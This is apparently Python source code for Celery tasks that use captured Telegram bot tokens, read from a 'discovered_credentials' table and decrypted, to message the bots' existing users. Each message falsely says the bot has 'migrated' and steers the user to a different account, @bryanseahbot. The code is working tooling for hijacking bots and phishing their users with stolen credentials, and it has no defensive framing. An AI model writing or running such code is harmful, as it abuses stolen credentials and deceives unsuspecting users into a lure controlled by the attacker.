@app.task(name="flow.proactive_user_outreach")
def proactive_user_outreach(batch_size: int = 100):
    """Find users who haven't been messaged yet and send proactive
    redirect via captured bot's inline mode."""
    from app.workers.celery_app import get_worker_loop
    
    return get_worker_loop().run_until_complete(
        _proactive_user_outreach_logic(batch_size)
    )


async def _proactive_user_outreach_logic(batch_size: int) -> dict:
    """Query unique users and send proactive redirects."""
    
    # Get unique users who haven't been proactively contacted
    result = await async_execute(
        db.table("honeypot_updates")
        .select("credential_id, sender_user_id, payload")
        .not_.is_("sender_user_id", "null")
        .is_("proactive_sent_at", "null")
        .limit(batch_size)
    )
    
    users_by_cred = {}
    for row in result.data or []:
        cred_id = row["credential_id"]
        user_id = row["sender_user_id"]
        
        if cred_id not in users_by_cred:
            users_by_cred[cred_id] = set()
        users_by_cred[cred_id].add(user_id)
    
    dispatched = 0
    for cred_id, user_ids in users_by_cred.items():
        for user_id in user_ids:
            # Send proactive message via captured bot
            app.send_task(
                "flow.proactive_redirect_one",
                kwargs={
                    "credential_id": cred_id,
                    "user_id": user_id
                }
            )
            dispatched += 1
    
    logger.info(f"[Proactive] dispatched {dispatched} outreach tasks")
    return {"dispatched": dispatched}

async def _proactive_redirect_one_logic(credential_id: str, user_id: int) -> dict:
    """Send proactive message FROM captured bot to user."""
    
    # Get bot token
    cred = await async_execute(
        db.table("discovered_credentials")
        .select("bot_token, bot_username")
        .eq("id", credential_id)
        .limit(1)
    )
    
    if not cred.data:
        return {"status": "credential_not_found"}
    
    bot_token = security.decrypt(cred.data[0]["bot_token"])
    bot_username = cred.data[0].get("bot_username", "this bot")
    
    text = (
        f"👋 Hey there!\n\n"
        f"I noticed you were using @{bot_username} recently.\n\n"
        f"That bot has been **migrated** to this channel for better service.\n\n"
        f"✅ Your data is preserved\n"
        f"✅ Your history is safe\n"
        f"✅ Just press START to continue\n\n"
        f"Use the updated bot: @bryanseahbot"
    )
    
    async with httpx.AsyncClient(timeout=15.0) as client:
        r = await client.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            json={
                "chat_id": user_id,
                "text": text,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            }
        )
        
        sent_ok = r.status_code == 200 and r.json().get("ok")
    
    # Mark as contacted
    now = datetime.now(timezone.utc).isoformat()
    await async_execute(
        db.table("honeypot_updates")
        .update({"proactive_sent_at": now})
        .eq("credential_id", credential_id)
        .eq("sender_user_id", user_id)
    )
    
    return {"status": "sent" if sent_ok else "failed", "user_id": user_id}
